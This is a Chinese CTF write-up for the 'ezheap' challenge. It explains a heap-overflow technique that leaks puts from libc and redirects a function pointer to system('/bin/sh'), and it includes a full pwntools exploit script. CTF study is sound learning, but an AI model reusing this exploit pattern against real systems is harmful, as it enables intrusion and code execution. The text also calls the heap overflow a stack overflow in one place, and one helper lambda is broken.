# 堆溢出--ret2libc

## 题目：

[[HNCTF 2022 WEEK4\]ezheap | NSSCTF](https://www.nssctf.cn/problem/3104)

## 讲解：

1. 题目保护全开，要泄漏基地址：

   ![image-20240708171450265](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407081714304.png)

2. 利用栈溢出覆盖put参数泄漏libc基地址，再第二次用system的地址覆盖put函数，实现ret2libc。

### 泄漏libc基地址：

1. 使用put函数输出put函数的地址，先观察函数创建的堆结构：

   ![image-20240708170838451](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407081708517.png)

   ![image-20240708171106004](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407081711139.png)

2. 在看show函数的调用过程：

   ![image-20240708172552482](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407081725550.png)

3. 利用思路，先申请2个heap，用heap0的edit函数来覆盖heap1的content地址使其指向存放put函数地址的堆空间，再调用heap1的show函数，即可泄漏put函数的真实地址。

   调试来确定用0x80，来覆盖heap1的content低地址，使其指向存放put函数地址的堆空间：

   ![image-20240708171954987](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407081719042.png)

   ```python
   add(0,20,b"6",b"6")
   add(1,20,b"6",b"6")
   edit(0,p64(0)*3+p64(0x31)+p64(0)*2+p8(0x80)) //两个堆之间的偏移使固定的
   printf(1)
   ```

   成功覆盖，put函数在调用时会直接用支付穿输出0x000055df3bd91080处的内容，遇到b'\x00‘才停止。

   ![image-20240708172121614](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407081721683.png)

   成功泄漏puts函数的真实地址：

   ```python
   addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
   print(hex(addr))
   
   libc_base = addr - libc.symbols['puts']
   sys_addr = libc_base + libc.symbols['system']
   str_bin = libc_base + next(libc.search(b"/bin/sh"))
   log.success("libc_addr==>"+hex(libc_base))
   log.success("system_addr==>"+hex(sys_addr))
   log.success("bin_sh_addr==>"+hex(str_bin))
   ```

   ![image-20240708172657332](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407081726393.png)

   再用拿到的地址，照上面的思路继续用heap0覆盖heap1的堆，让存放puts函数地址的空间覆盖长system的地址，前面的参数地址覆盖成str_bin_sh的地址，两种覆盖方式：

   ```python
   # 覆盖content的地址，show函数要在第二次输出的时候调用system("/bin/sh")
   edit(0,p64(0)*3+p64(0x31)+p64(0)*2+p64(str_bin)+p64(1)+p64(sys_addr))
   # 覆盖name字段的参数，show函数在第一次输出的时候就会调用system("/bin/sh")
   # edit(0,p64(0)*3+p64(0x31)+b"/bin/sh\x00"+p64(0)*2+p64(1)+p64(sys_addr))
   ```

   ![image-20240708173133942](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407081731013.png)

   最后show(1)即可拿到shell，EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   #context(os='linux', arch='amd64')
   
   p = process('./pwn')
   # p = remote("node5.anna.nssctf.cn",20435)
   elf = ELF('./pwn')
   
   libc = ELF('./libc-2.23.so')
   
   n2b = lambda x    : str(x).encode()
   rv  = lambda x    : p.recv(x)
   ru  = lambda s    : p.recvuntil(s)
   sd  = lambda s    : p.send(s)
   sl  = lambda s    : p.sendline(s)
   sn  = lambda s    : sl(n2b(n))
   sa  = lambda t, s : p.sendafter(t, s)
   sla = lambda t, s : p.sendlineafter(t, s)
   sna = lambda t, n : sla(t, n2b(n))
   ia  = lambda      : p.interactive()
   rop = lambda r    : flat([p64(x) for x in r])
   
   def add(index,size,name,content):
       sla(':','1')
       sla(':',str(index))
       sla(':',str(size))
       sla(':',name)
       sla(':',content)
   
   def free(idx):
       sla(':','2')
       sla(':',str(idx))
   
   def printf(index):
       sla(b':',b'3')
       sla(b'idx:',str(index).encode())
   
   def edit(idx, content):
       sla(':','4')
       sla(':',str(idx))
       sa(':',str(len(content)))
       p.sendline(content)
   
   
   add(0,20,b"6",b"6")
   add(1,20,b"6",b"6")
   edit(0,p64(0)*3+p64(0x31)+p64(0)*2+p8(0x80))
   
   printf(1)
   addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
   print(hex(addr))
   
   
   libc_base = addr - libc.symbols['puts']
   sys_addr = libc_base + libc.symbols['system']
   str_bin = libc_base + next(libc.search(b"/bin/sh"))
   log.success("libc_addr==>"+hex(libc_base))
   log.success("system_addr==>"+hex(sys_addr))
   log.success("bin_sh_addr==>"+hex(str_bin))
   
   edit(0,p64(0)*3+p64(0x31)+p64(0)*2+p64(str_bin)+p64(1)+p64(sys_addr))
   # edit(0,p64(0)*3+p64(0x31)+b"/bin/sh\x00"+p64(0)*2+p64(1)+p64(sys_addr))
   
   printf(1)
   p.sendline(b'cat flag')
   ia()
   
   ```

   ![image-20240708173505490](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407081735591.png)